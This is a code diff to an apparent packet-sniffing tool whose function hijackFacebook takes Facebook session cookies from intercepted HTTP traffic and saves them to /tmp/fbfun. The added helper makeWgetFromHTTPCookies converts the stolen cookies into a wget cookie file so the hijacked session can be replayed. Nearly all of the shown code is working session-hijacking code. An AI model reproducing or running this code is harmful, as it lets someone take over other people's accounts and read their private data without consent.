@@ -21,13 +21,47 @@ def hijackFacebook(Headers, ipsrc='', hook='', pkt='', session=''):
         # cookie was transsfered, lets save it for fun
         if not os.path.exists("/tmp/fbfun/"+cookiename[0]):
             fbfunCookie = open("/tmp/fbfun/"+cookiename[0], "w")
-            fbfunCookie.write(Headers['headers']['cookie'][0]+"\n")
-
-            # set default useragent if nothing was captured
-            if not Headers['headers'].has_key('user-agent'):
-                Headers['headers']['user-agent'] = 'Mozilla/5.0 (X11; U; Ubuntu Linux; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/11.0.696.3'
-            
-            # finally close the file
-            fbfunCookie.write(Headers['headers']['user-agent'][0])
+            wgetCookies = makeWgetFromHTTPCookies(Headers['headers']['cookie'][0])
+            fbfunCookie.write(wgetCookies)
             fbfunCookie.close()
+
+def makeWgetFromHTTPCookies(a):
+    Domain = ".facebook.com"
+    DefaultPath = "/"
+    print "a = "+a
+    AllCookies = "" # RESULT
+    CookieList = a.split(';');
+    ElementID = 0
+    CountOfCookies = len(CookieList)
+
+    for Element in CookieList:
+        ElementID = ElementID+1
+        # STRIP NEW LINES
+        Element = Element.replace("\n", "")
+
+        while Element[0:1] == " ": # STRIP WHITE SPACES FROM BEGINNING OF STRING
+            Element = Element[1:]
+
+        CookieSyntax = Element.split("=");
+
+        if len(CookieSyntax) > 0:
+            SimpleCookieString = Domain+"	TRUE	"+DefaultPath+"	FALSE	0	"+CookieSyntax[0]+"	"
+                
+
+            # if the cookie is more complicated (too many "=")
+            if len(CookieSyntax) > 2:
+                for CookieSyntaxValue in CookieSyntax:
+                    if CookieSyntaxValue == CookieSyntax[0]:
+                        continue
+
+                    SimpleCookieString=SimpleCookieString+"="+CookieSyntaxValue
+            else:
+                SimpleCookieString = SimpleCookieString+CookieSyntax[1] # for simple cookie its not complicated, it has "one value"
+
+        if ElementID == CountOfCookies:
+            AllCookies = AllCookies+SimpleCookieString
+        else:
+            AllCookies = AllCookies+SimpleCookieString+"\n"
+
+    return AllCookies
         
